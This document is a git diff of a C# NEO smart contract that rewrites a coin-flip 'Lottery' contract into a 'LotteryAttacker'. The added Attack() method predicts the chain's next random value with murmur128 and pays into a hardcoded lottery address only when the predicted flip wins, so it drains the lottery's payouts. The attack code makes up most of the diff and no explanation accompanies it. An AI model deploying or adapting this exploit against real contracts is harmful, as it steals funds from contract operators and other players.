@@ -2,6 +2,7 @@
 using System.ComponentModel;
 using System.Numerics;
 using Neo;
+using Neo.SmartContract;
 using Neo.SmartContract.Framework;
 using Neo.SmartContract.Framework.Attributes;
 using Neo.SmartContract.Framework.Native;
@@ -9,36 +10,40 @@ using Neo.SmartContract.Framework.Services;
 
 namespace Lottery
 {
-    [DisplayName("Lottery")]
+    [DisplayName("LotteryAttacker")]
     [ManifestExtra("Author", "NEO")]
     [ManifestExtra("Email", "developer@neo.org")]
-    [ManifestExtra("Description", "This is a Lottery. Send 1 NEO and you will probably get 2 NEO.")]
-    public class Lottery : SmartContract
+    [ManifestExtra("Description", "This is a LotteryAttacker")]
+    public class LotteryAttacker : SmartContract
     {
+        [InitialValue("NQpRgzN6TVoJ7MMTVsHzvvrfidgjtJNEdo", ContractParameterType.Hash160)]
+        private static readonly UInt160 Lottery = default;
+        
         public static void OnNEP17Payment(UInt160 from, BigInteger amount, object data)
         {
-            if (Runtime.CallingScriptHash == NEO.Hash && amount == 1)
-            {
-                if (Runtime.GetRandom() % 2 == 1) {
-                    ExecutionEngine.Assert(NEO.Transfer(Runtime.ExecutingScriptHash, from, 2, data));
+        }
+        public static int Attack() {
+            BigInteger rand = Runtime.GetRandom();
+            for (int i = 0; i < 10; i++) {
+                byte[] nextrand = murmur128(rand.ToByteArray(), Runtime.GetNetwork());
+                if ((new BigInteger(nextrand)) % 2 == 1) {
+                    NEO.Transfer(Runtime.ExecutingScriptHash, Lottery, 1, null);
+                    return (int)(new BigInteger(nextrand));
                 }
             }
+            return 0;
+        }
+        public static void Update(ByteString nefFile, string manifest)
+        {
+            ContractManagement.Update(nefFile, manifest, null);
+        }
+        public static byte[] murmur128(byte[] nonceData, uint seed) {
+            // ExecutionEngine.Assert(nonceData.Length == 16, "invalid nonce length");
+            return Murmur128.HashCore(nonceData, seed);
         }
 
-        // public static void Attack() {
-        //     var rand = Runtime.GetRandom();
-        //     for (int i = 0; i < 10; i++) {
-        //         var nextrand = (BigInteger)Contract.Call(CryptoLib.Hash, "murmur128", CallFlags.All, new object[]{rand, Runtime.GetNetwork()});
-        //         if (nextrand % 2 == 1) {
-        //             NEO.Transfer((UInt160)"0xTODO".ToByteArray(), (UInt160)"0xTODO".ToByteArray(), 1, null);
-        //         }
-
-        //     }
-        // }
-
-        // public static void Update(ByteString nefFile, string manifest)
-        // {
-        //     ContractManagement.Update(nefFile, manifest, null);
-        // }
+        public static bool check(byte[] nonceData, uint seed) {
+            return nonceData.Length == 16;
+        }
     }
 }
